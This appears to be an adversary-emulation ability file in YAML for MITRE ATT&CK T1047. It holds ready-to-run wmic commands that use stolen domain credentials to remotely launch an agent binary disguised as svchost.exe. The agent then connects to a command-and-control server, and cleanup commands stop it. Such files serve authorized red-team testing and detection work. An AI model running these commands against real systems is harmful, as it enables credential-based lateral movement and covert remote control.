---

- id: 2a32e46f-5346-45d3-9475-52b857c05342
  name: Start 54ndc47 (WMI)
  description: Remotely executes 54ndc47 over WMI
  tactic: execution
  technique:
    attack_id: T1047
    name: Windows Management Instrumentation
  platforms:
    windows:
      psh:
        command: |
          wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\Users\Public\svchost.exe -server #{server}";
        cleanup: |
          wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where "ExecutablePath='C:\\Users\\Public\\svchost.exe'" call terminate;
      cmd:
        command: |
          wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "cmd.exe /c C:\Users\Public\svchost.exe -server #{server}";
        cleanup: |
          wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where "ExecutablePath='C:\\Users\\Public\\svchost.exe'" call terminate;
  singleton: True
  requirements:
    - plugins.stockpile.app.requirements.basic:
      - source: domain.user.name
        edge: has_password
        target: domain.user.password
